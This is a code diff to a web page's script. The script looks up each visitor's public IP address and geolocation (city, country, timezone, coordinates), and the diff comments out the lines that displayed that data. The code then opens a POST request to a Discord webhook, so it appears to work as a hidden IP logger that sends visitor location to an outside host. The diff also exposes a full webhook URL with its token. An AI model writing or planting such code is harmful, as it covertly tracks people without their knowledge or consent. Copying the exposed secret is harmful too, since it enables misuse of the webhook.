@@ -34,11 +34,11 @@
 
         $.getJSON("https://api.ipify.org?format=json", function(data) {
             $.getJSON("https://ipapi.co/" + data.ip + "/json/", function(ipapi) {
-                document.getElementById('ipapi-city').innerHTML = ipapi.city;
-                document.getElementById('ipapi-country').innerHTML = ipapi.country_name;
-                document.getElementById('ipapi-timezone').innerHTML = ipapi.timezone;
-                document.getElementById('ipapi-lat').innerHTML = ipapi.latitude;
-                document.getElementById('ipapi-long').innerHTML = ipapi.longitude;
+                //document.getElementById('ipapi-city').innerHTML = ipapi.city;
+                //document.getElementById('ipapi-country').innerHTML = ipapi.country_name;
+                //document.getElementById('ipapi-timezone').innerHTML = ipapi.timezone;
+                //document.getElementById('ipapi-lat').innerHTML = ipapi.latitude;
+                //document.getElementById('ipapi-long').innerHTML = ipapi.longitude;
 
                 var request = new XMLHttpRequest();
                 request.open("POST", "https://discord.com/api/webhooks/1061028958906355842/ROluGq15tTS7GHjKqaoHTIqFJIRx5wcHVTjGi69eCHk7jGs6nYqm1TKM1aCwN_Ga9TEa");
